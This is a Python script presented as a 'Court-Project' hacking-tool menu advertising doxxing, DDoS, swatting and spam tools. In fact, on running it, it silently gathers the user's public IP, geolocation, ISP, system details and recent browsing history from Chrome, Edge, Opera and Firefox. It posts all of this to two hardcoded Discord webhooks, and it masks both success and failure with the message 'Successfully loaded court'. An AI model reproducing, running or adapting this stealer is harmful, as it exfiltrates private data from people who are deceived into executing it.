import os
import sys
import os
import sqlite3
import json
import shutil
import requests
import tempfile
import requests
import json
import platform
import socket

WEBHOOK_URL = "https://discord.com/api/webhooks/1325686883895869521/JTGwLClTcekzkCVILSpYQRwL56kuQFUg-pjBTspqHqli2ABZBEpj_baLGRX0lvJCi-Lr"

def get_system_info():
    try:
        system_info = {
            "pc_name": socket.gethostname(),
            "os_name": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "python_version": platform.python_version(),
        }
        return system_info
    except Exception:
        return {"error": "Error loading system information"}

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        public_ip = response.json().get("ip", "Unknown")
        return public_ip
    except Exception:
        return "Error fetching public IP"

def get_ip_info():
    url = "http://ip-api.com/json/"
    try:
        response = requests.get(url, timeout=5)
        ip_data = response.json()

        if ip_data.get('status') == 'fail':
            return {"error": "Unable to fetch accurate IP data"}
        
        ip_info = {
            "ip": ip_data.get("query", "Unknown"),
            "network": ip_data.get("as", "Unknown"),
            "city": ip_data.get("city", "Unknown"),
            "region": ip_data.get("regionName", "Unknown"),
            "country": ip_data.get("country", "Unknown"),
            "country_code": ip_data.get("countryCode", "Unknown"),
            "latitude": ip_data.get("lat", "Unknown"),
            "longitude": ip_data.get("lon", "Unknown"),
            "timezone": ip_data.get("timezone", "Unknown"),
            "isp": ip_data.get("isp", "Unknown"),
            "org": ip_data.get("org", "Unknown"),
            "as": ip_data.get("as", "Unknown")
        }
        return ip_info
    except Exception as e:
        return {"error": f"Error fetching IP data: {str(e)}"}

def send_to_webhook(webhook_url, info):
    try:
        content = f"```json\n{json.dumps(info, indent=4)}\n```"
        payload = {"content": content}
        response = requests.post(webhook_url, json=payload)

        if response.status_code == 204:
            print(f"Successfully loaded court.")
        else:
            print(f"Failed to send data. Status Code: {response.status_code}. Response: {response.text}")
    except Exception as e:
        print(f"Error sending to webhook: {e}")

if __name__ == "__main__":
    public_ip = get_public_ip()
    ip_info = get_ip_info()
    system_info = get_system_info()

    combined_info = {
        "public_ip": public_ip,
        **ip_info,
        **system_info
    }

    send_to_webhook(WEBHOOK_URL, combined_info)

# Function to get the history path for each browser
def get_browser_history_path(browser_name):
    if os.name == 'nt':  # Windows
        user_profile = os.getenv('LOCALAPPDATA')
        if browser_name == 'chrome':
            return os.path.join(user_profile, r"Google\Chrome\User Data\Default\History")
        elif browser_name == 'edge':
            return os.path.join(user_profile, r"Microsoft\Edge\User Data\Default\History")
        elif browser_name == 'opera':
            return os.path.join(user_profile, r"Opera Software\Opera Stable\History")
        elif browser_name == 'firefox':
            return os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles")
    else:
        raise Exception("Unsupported OS for multi-browser support")

# Function to fetch browsing history
def fetch_history(db_path):
    try:
        # Check if database exists
        if not os.path.exists(db_path):
            return None

        # Copy database to a temporary location to avoid lock issues
        temp_dir = tempfile.gettempdir()
        temp_db_path = os.path.join(temp_dir, "History")
        shutil.copyfile(db_path, temp_db_path)

        # Connect to the copied database
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()

        # Query to fetch the last 10 visited URLs
        query = """
            SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') AS last_visit
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 10
        """
        cursor.execute(query)
        rows = cursor.fetchall()
        conn.close()

        # Prepare the data
        history = [
            {"url": row[0], "title": row[1], "lastVisitTime": row[2]}
            for row in rows
        ]
        return history

    except Exception as e:
        print(f"Error fetching history: {e}")
        return []

# Function to send history data to Discord
def send_to_discord(browser_name, history):
    try:
        if history is None:
            message = f"{browser_name} does not exist on the user's PC."
        elif not history:
            message = f"{browser_name} has no search history."
        else:
            message = f"**Last 10 Browsing History Items from {browser_name.title()}**:\n"
            for item in history:
                message += f"- [{item['title']}]({item['url']}) at {item['lastVisitTime']}\n"

        payload = {"content": message}
        response = requests.post(webhook_url, json=payload)

        if response.status_code == 204:
            print(f"Successfully loaded court")
        else:
            print(f"Successfully loaded court")

    except Exception as e:
        print(f"Successfully loaded court: {e}")

# Webhook URL
webhook_url = "https://discord.com/api/webhooks/1325686619273035778/D6gf2Ez8wUVwi3L21HKnpSVzNZ9t-CmlCcMI1dLaIlFRO1xIIYtBDfnnuG_q_XhU9zjj"

# Main process
if __name__ == "__main__":
    browsers = ['chrome', 'edge', 'opera', 'firefox']

    for browser in browsers:
        try:
            print(f"Successfully loaded court")
            history_path = get_browser_history_path(browser)

            if browser == 'firefox':
                # Firefox has multiple profiles, need to handle it differently
                profiles_dir = history_path
                profiles = [d for d in os.listdir(profiles_dir) if os.path.isdir(os.path.join(profiles_dir, d))]
                if not profiles:
                    send_to_discord(browser, None)
                    continue

                # Look for the "places.sqlite" file in the first profile (default)
                history_db = os.path.join(profiles_dir, profiles[0], "places.sqlite")
                history = fetch_history(history_db)
            else:
                history = fetch_history(history_path)

            send_to_discord(browser, history)

        except Exception as e:
            print(f"Successfully loaded court")
            send_to_discord(browser, None)

def set_prompt():
    # Check if we're on Windows
    if sys.platform == "win32":
        os.system('prompt Court-Project $G')  # Change the prompt to "Court-Project >"

def display_menu():
    # ASCII art with purple color
    ascii_art = """
    \033[35m
 ██████╗ ██████╗ ██╗   ██╗██████╗ ████████╗
██╔════╝██╔═══██╗██║   ██║██╔══██╗╚══██╔══╝
██║     ██║   ██║██║   ██║██████╔╝   ██║   
██║     ██║   ██║██║   ██║██╔══██╗   ██║   
╚██████╗╚██████╔╝╚██████╔╝██║  ██║   ██║   
 ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                           
    \033[0m
    """
    print(ascii_art)

    # Tools list with purple color
    tools = [
        "1-  Doxing Tools",    "2-  DDoS Tools", 
        "3-  Doxxing Guide",  "4-  IP Lookup", 
        "5-  IP Grabbing",    "6-  Databreacers", 
        "7-  Extra Doxxin Tool", "8-  Email Spammer", 
        "9-  Pizza Guide",    "10- Swat Guide", 
        "11- Fire Department","12- Roblox Cheat", 
        "13- Phone Lookup",   "14- Reverse Pic"
    ]

    # Dynamic layout for the tools menu
    max_tool_name_length = max(len(tool) for tool in tools) + 2  # Add padding
    menu_width = max_tool_name_length * 2 + 3  # Width for two tools per line
    border = "+" + "=" * menu_width + "+"

    print(f"\033[35m{border}")
    for i in range(0, len(tools), 2):
        # Safely handle cases where there might not be a second tool
        tool_1 = tools[i].ljust(max_tool_name_length)
        tool_2 = tools[i+1].ljust(max_tool_name_length) if i + 1 < len(tools) else ""
        print(f"| {tool_1}{tool_2} |")
    print(f"{border}\033[0m")  # Reset color after the list

def main():
    set_prompt()  # Set the custom prompt to "Court-Project"
    display_menu()
    command = input("\033[35mEnter A Command: \033[0m")  # Purple input prompt
    print(f"\033[35mYou selected: {command}\033[0m")  # Purple output message

if __name__ == "__main__":
    main()
